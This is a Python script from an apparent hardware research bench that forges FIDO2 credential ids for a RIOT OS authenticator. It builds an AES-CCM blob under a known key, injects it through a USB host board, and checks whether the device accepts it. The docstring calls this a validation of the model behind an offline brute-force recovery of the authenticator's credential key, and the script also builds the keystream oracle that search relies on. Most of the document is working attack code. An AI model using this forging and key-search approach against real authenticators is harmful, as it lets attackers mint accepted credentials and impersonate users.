#!/usr/bin/env python3
"""Forge a credential id with a known key and see whether the victim accepts it.

The offline key search that turns this campaign's ~46 residual bits into a full key
rests on a MODEL of what the authenticator decrypts, derived from source:

    credential id = ciphertext(136) || mac(16) || nonce(13)
    plaintext     = the first 136 bytes of `struct ctap_resident_key`, which is
                    __attribute__((packed)) and STARTS with rp_id_hash[32]
    CCM           = RFC 3610, L = 2, M = 16, no auth data, 13-byte nonce, and the
                    data blocks start at counter 1 because cipher_encrypt_ctr burns
                    counter 0 on the MAC tag

The way to check a model of a MAC is to build a blob that satisfies it. If the model
is right, `_ctap_decrypt_rk` verifies, `_find_matching_rks` matches on rp_id_hash and
the reply stops being **CTAP2_ERR_NO_CREDENTIALS (0x2E)**. If any part of the model is
wrong -- nonce placement, counter start, flags byte, MAC length, field order -- the MAC
fails and the reply stays 0x2E. It is a binary test of the whole construction.

It also demonstrates the consequence directly: anyone holding `cred_key` can mint
credentials the authenticator will assert with, which is what makes the key worth
recovering rather than merely interesting.

Two notes on what is being shown. The key here is one this bench wrote into the
victim's flash, so this is a validation of the model, not a break; and the blob is 164
bytes rather than the 165 RIOT itself emits, because TinyCBOR's
`cbor_value_copy_byte_string` needs len + 1 -- so the nonce's last byte must be zero,
which costs nothing since the attacker chooses the nonce.
"""

from __future__ import annotations

import argparse
import hashlib
import os
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "hardware"))
sys.path.insert(0, str(Path(__file__).resolve().parent))
import boards  # noqa: E402

from usbhost_capture import HOST_BOARD, VICTIM_BOARD, Host, reset_boards  # noqa: E402

ENC_SIZE = 136          # CTAP_CREDENTIAL_ID_ENC_SIZE
MAC_LEN = 16            # CCM_MAC_MAX_LEN
NONCE_LEN = 13          # CTAP_AES_CCM_NONCE_SIZE


def build_plaintext(rp_id: str, priv_key: bytes) -> bytes:
    """The first 136 bytes of `struct ctap_resident_key`.

    Only the leading rp_id_hash has to be right: `_find_matching_rks` compares that
    and nothing else before accepting the credential. The rest is filled so the
    struct is plausible if the request gets as far as signing.
    """
    pt = bytearray(ENC_SIZE)
    pt[0:32] = hashlib.sha256(rp_id.encode()).digest()   # rp_id_hash
    # user_id[64] stays zero, user_id_len = 0, then priv_key at offset 97.
    pt[32 + 64] = 0
    pt[97:97 + 32] = priv_key
    return bytes(pt)


def forge(key: bytes, rp_id: str, nonce: bytes, priv_key: bytes) -> tuple[bytes, bytes]:
    """Return (credential id of 165 bytes, the first keystream block).

    The keystream block is the offline-verification oracle the brute force uses:
    AES_k(0x01 || nonce || 0x0001) == ciphertext[0:16] XOR plaintext[0:16].
    """
    from Crypto.Cipher import AES

    pt = build_plaintext(rp_id, priv_key)
    c = AES.new(key, AES.MODE_CCM, nonce=nonce, mac_len=MAC_LEN)
    ct, tag = c.encrypt_and_digest(pt)
    assert len(ct) == ENC_SIZE and len(tag) == MAC_LEN
    cred = ct + tag + nonce

    ks = bytes(a ^ b for a, b in zip(ct[:16], pt[:16]))
    a1 = bytes([0x01]) + nonce + b"\x00\x01"
    check = AES.new(key, AES.MODE_ECB).encrypt(a1)
    assert ks == check, "counter-block model is wrong before we even reach the device"
    return cred, ks


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--key", required=True, help="the key in the victim's flash, hex")
    ap.add_argument("--rp-id", default="example.com",
                    help="must match the rp id the probe sends in getAssertion")
    ap.add_argument("--idlen", type=int, default=164)
    ap.add_argument("--entries", type=int, default=1)
    ap.add_argument("--trials", type=int, default=6)
    ap.add_argument("--nonce", default=None,
                    help="13-byte nonce as hex, for a REPRODUCIBLE vector; the last byte "
                         "must be 00 because a 164-byte id makes TinyCBOR NUL the 165th")
    ap.add_argument("--priv-key", default=None, help="32 bytes as hex, for reproducibility")
    ap.add_argument("--vector-out", default=None,
                    help="write the hardware-verified test vector here as JSON")
    ap.add_argument("--no-flash", action="store_true")
    args = ap.parse_args()

    key = bytes.fromhex(args.key)
    # The last nonce byte must be zero: a 164-byte id means TinyCBOR writes NUL into
    # the 165th byte, which is nonce[12].
    nonce = bytes.fromhex(args.nonce) if args.nonce else os.urandom(NONCE_LEN - 1) + b"\x00"
    if len(nonce) != NONCE_LEN or nonce[-1] != 0:
        raise SystemExit("--nonce must be 13 bytes with the last byte 00")
    priv = bytes.fromhex(args.priv_key) if args.priv_key else os.urandom(32)
    cred, ks = forge(key, args.rp_id, nonce, priv)
    print(f"rp_id            {args.rp_id}")
    print(f"rp_id_hash       {hashlib.sha256(args.rp_id.encode()).digest().hex()}")
    print(f"nonce            {nonce.hex()}")
    print(f"credential id    {len(cred)} bytes, sending the first {args.idlen}")
    print(f"keystream blk 1  {ks.hex()}   (= AES_k(01 || nonce || 0001))")

    boards.require(HOST_BOARD)
    boards.require(VICTIM_BOARD)
    if not args.no_flash:
        boards.flash(HOST_BOARD, str(ROOT / "instruments/ctaphost/fw.bin"))
        time.sleep(0.5)
    reset_boards()
    h = Host(boards.BOARDS[HOST_BOARD]["port"])
    h.bring_up()
    h.cmd("D 0 3000 4000", 0.4, cap=80)      # the long guard: reliability over resolution
    h.cmd("A 0", 0.3, cap=64)
    h.cmd("S 0", 0.3, cap=64)
    h.cmd("N 300", 0.3, cap=64)
    h.cmd("L 0 0 0", 0.3, cap=64)
    h.cmd(f"G 1 {args.idlen}", 2.5)

    # Control first: a random id under the same settings must answer 0x2E.
    h.cmd("H", 0.3, cap=64)
    out = h.cmd(f"G {args.entries} {args.idlen}", 4.0, cap=3000)
    ctrl = next((l.strip() for l in out.splitlines() if "entries=" in l), "(none)")
    print(f"\ncontrol, random id : {ctrl[:110]}")

    blob = cred[:args.idlen]
    for off in range(0, len(blob), 24):
        chunk = blob[off:off + 24]
        r = h.cmd(f"H {off} {chunk.hex()}", 0.25, cap=120)
        if "loaded" not in r:
            print(f"  load failed at {off}: {r.strip()}")
            return 1
    print(f"forged id loaded ({len(blob)} bytes)")

    seen = []
    for i in range(args.trials):
        out = h.cmd(f"G {args.entries} {args.idlen}", 4.0, cap=3000)
        line = next((l.strip() for l in out.splitlines() if "entries=" in l), "")
        if not line:
            h.cmd("I", 2.0)
            continue
        f = dict(t.split("=", 1) for t in line.replace("->", " ").split() if "=" in t)
        seen.append(f.get("status", "?"))
        print(f"  trial {i}: {line[:110]}")

    print()
    if not seen:
        print("no replies: inconclusive")
        return 1
    if all(s == "0x2e" for s in seen):
        print("RESULT: still 0x2E -- the MAC did NOT verify, so the model is wrong "
              "somewhere (nonce placement, counter start, flags, or field order).")
        return 1
    print(f"RESULT: statuses {seen} -- at least one reply is NOT 0x2E, so the forged "
          f"blob's MAC VERIFIED and _find_matching_rks accepted it.")
    if args.vector_out:
        import json
        pt = build_plaintext(args.rp_id, priv)
        a1 = bytes([0x01]) + nonce + b"\x00\x01"
        vec = {
            "what": "hardware-verified CCM / credential-id format vector, RIOT FIDO2",
            "victim": "nRF52840-DK, RIOT f59dcdace51d34218c24339d299ebc3777ec45bc, "
                      "tests/sys/fido2_ctap_hid, unmodified",
            "device_statuses_observed": seen,
            "accepted_by_device": any(x != "0x2e" for x in seen),
            "cred_key_hex": key.hex(),
            "rp_id": args.rp_id,
            "rp_id_hash_hex": hashlib.sha256(args.rp_id.encode()).hexdigest(),
            "nonce_hex": nonce.hex(),
            "priv_key_in_plaintext_hex": priv.hex(),
            "plaintext_136_hex": pt.hex(),
            "credential_id_165_hex": cred.hex(),
            "bytes_sent_to_device": args.idlen,
            "counter_block_A1_hex": a1.hex(),
            "keystream_block_1_hex": ks.hex(),
            "oracle": "AES128_ECB_encrypt(cred_key, counter_block_A1) == keystream_block_1"
                      " == credential_id[0:16] XOR plaintext[0:16]",
        }
        Path(args.vector_out).write_text(json.dumps(vec, indent=2) + "\n")
        print(f"wrote test vector to {args.vector_out}")
    print("The decryption model is confirmed, and with it the offline oracle: one "
          "known plaintext block gives AES_k(A_1), so a candidate key can be tested "
          "without touching the device.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
